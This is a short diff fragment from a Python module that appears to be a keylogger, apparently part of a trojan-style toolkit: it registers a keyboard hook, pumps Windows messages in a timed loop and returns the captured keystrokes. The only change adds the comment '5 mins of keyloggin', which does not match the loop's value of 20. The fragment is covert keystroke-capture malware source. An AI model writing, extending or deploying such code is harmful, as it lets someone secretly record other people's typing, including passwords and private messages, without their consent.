@@ -76,7 +76,7 @@ def run(**args):
 
 	#register the hook and execute forever
 	kl.HookKeyboard()
-	while time.clock() < 20:
+	while time.clock() < 20: #5 mins of keyloggin
 		pythoncom.PumpWaitingMessages()
 
 	return str(keystrokes)
